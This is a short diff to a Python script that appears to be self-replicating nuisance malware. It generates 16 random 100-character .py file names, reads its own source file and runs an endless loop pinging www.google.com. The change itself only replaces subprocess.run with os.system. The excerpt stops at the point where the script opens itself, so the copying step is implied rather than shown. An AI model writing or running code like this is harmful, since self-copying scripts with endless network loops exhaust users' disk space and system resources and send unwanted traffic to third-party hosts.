@@ -1,5 +1,4 @@
 import random as r
-import subprocess as sub
 import threading
 import sys
 import os
@@ -7,7 +6,7 @@ def mkname(s):
     return ''.join(r.choice(s) for i in range(100))+'.py'
 def pinger():
     while True:
-        sub.run('ping www.google.com')
+        os.system('ping www.google.com')
 s = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890'
 names = [mkname(s) for i in range(16)]
 with open(sys.argv[0], 'r') as f:
